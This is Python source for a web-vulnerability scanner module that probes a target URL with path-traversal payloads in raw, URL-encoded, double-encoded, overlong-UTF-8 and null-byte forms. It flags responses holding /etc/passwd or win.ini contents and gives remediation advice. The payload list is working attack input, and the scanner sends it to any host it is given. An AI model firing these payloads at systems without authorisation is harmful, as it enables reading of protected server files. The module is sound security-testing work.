#!/usr/bin/env python3
"""
NEXUS-STRIKE — webapp.traversal
Domain: webapp
Path traversal detection via direct-path payload injection.

Previously: a dummy stub identical across all 17 webapp.* "secondary"
tools (DNS resolve + bare GET of "/", no traversal payloads sent at all).
Now: real GETs of path-traversal payloads appended directly to the URL
*path* (not query parameters — that overlapping case, e.g. ?file=../../,
is webapp.lfi's job), covering raw ../ sequences, URL-encoded, double-
URL-encoded, and overlong-UTF8 encoded variants, checking each response
for genuine traversal indicators (/etc/passwd contents, Windows hosts
file contents, directory-listing disclosure).
"""
from __future__ import annotations
from nexus.foundation.net import safe_urlopen

import re
import urllib.error
import urllib.request
import urllib.parse
from typing import Any

from nexus.foundation.schema import (
    Finding,
    STATUS_COMPLETED,
    STATUS_FAILED,
    STATUS_NO_FINDINGS,
    tool_result,
)
from nexus.tools.registry import tool_registry
from nexus.foundation.ssl_config import get_ssl_context

USER_AGENT = "NEXUS-STRIKE/1.0.0 (Path Traversal Detector)"

# Path-level (not query-parameter) traversal payloads, appended to the
# target's base path.
TRAVERSAL_PAYLOADS = [
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
    "....//....//....//....//etc/passwd",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "../../../../../../etc/passwd%00",
]

TRAVERSAL_SIGNATURES = [
    (r"root:.*?:0:0:", "root user entry in /etc/passwd"),
    (r"daemon:.*?:\d+:\d+:", "daemon user in /etc/passwd"),
    (r"\[fonts\]|\[extensions\]|\[mci extensions\]", "Windows win.ini contents"),
    (r"; for 16-bit app support", "Windows win.ini contents"),
    (r"Index of /", "directory listing disclosure"),
]


def _http_request(url: str, timeout: int = 10) -> dict:
    """Make a real HTTP GET and return status/body."""
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
        ctx = get_ssl_context(url, allow_insecure=True)
        resp = safe_urlopen(req, timeout=timeout, context=ctx)
        body = resp.read(65536).decode("utf-8", errors="replace")
        return {"status": resp.status, "body": body, "error": None}
    except urllib.error.HTTPError as e:
        body = e.read(65536).decode("utf-8", errors="replace") if e.fp else ""
        return {"status": e.code, "body": body, "error": None}
    except Exception as e:
        return {"status": 0, "body": "", "error": str(e)[:100]}


def run(target: str, timeout: int = 10, max_payloads: int = 20, **kwargs: Any) -> dict:
    """Test target for path-traversal vulnerabilities via direct path injection.

    Parameters
    ----------
    target : str
        Target URL or hostname to test.
    timeout : int
        Request timeout in seconds.
    max_payloads : int
        Maximum path-traversal payloads to try.
    """
    if not target or not target.strip():
        return tool_result("webapp.traversal", target, status=STATUS_FAILED, error="Empty target")

    base_url = target if "://" in target else f"http://{target}"
    parsed = urllib.parse.urlparse(base_url)
    root = f"{parsed.scheme}://{parsed.netloc}"

    findings: list[Finding] = []
    vulns: list[dict] = []
    tried: list[str] = []

    for payload in TRAVERSAL_PAYLOADS[:max_payloads]:
        test_url = f"{root}/{payload}"
        tried.append(test_url)
        resp = _http_request(test_url, timeout)
        if resp["status"] and resp["status"] not in (0, 404):
            for pattern, desc in TRAVERSAL_SIGNATURES:
                if re.search(pattern, resp["body"], re.IGNORECASE):
                    vulns.append({"payload": payload, "url": test_url, "signature": desc})
                    findings.append(Finding(
                        title="Path traversal vulnerability confirmed",
                        severity="critical",
                        confidence="high",
                        affected_asset=test_url,
                        evidence=f"Payload path '{payload}' matched: {desc}",
                        remediation="Canonicalize and validate all file paths server-side; reject '..' sequences and enforce a base-directory allow-list.",
                        tool="webapp.traversal",
                        references=["CWE-22", "OWASP-A01"],
                    ))
                    break
        if vulns:
            break

    status = STATUS_COMPLETED if vulns else STATUS_NO_FINDINGS
    summary = f"Path traversal testing completed: {len(tried)} payload(s) tried, {len(vulns)} confirmed"

    return tool_result(
        "webapp.traversal", target,
        status=status,
        findings=findings,
        summary=summary,
        metadata={"payloads_tried": len(tried), "vulnerabilities": vulns},
    )


tool_registry.register("webapp.traversal", run, metadata={
    "name": "webapp.traversal",
    "domain": "webapp",
    "status": "completed",
    "description": "Path traversal detection via direct URL-path payload injection (raw, encoded, double-encoded, overlong-UTF8 variants)",
    "parameters": {
        "target": "Target URL or hostname to test",
        "timeout": "Request timeout in seconds (default: 10)",
        "max_payloads": "Maximum path-traversal payloads to try (default: 20)",
    },
})
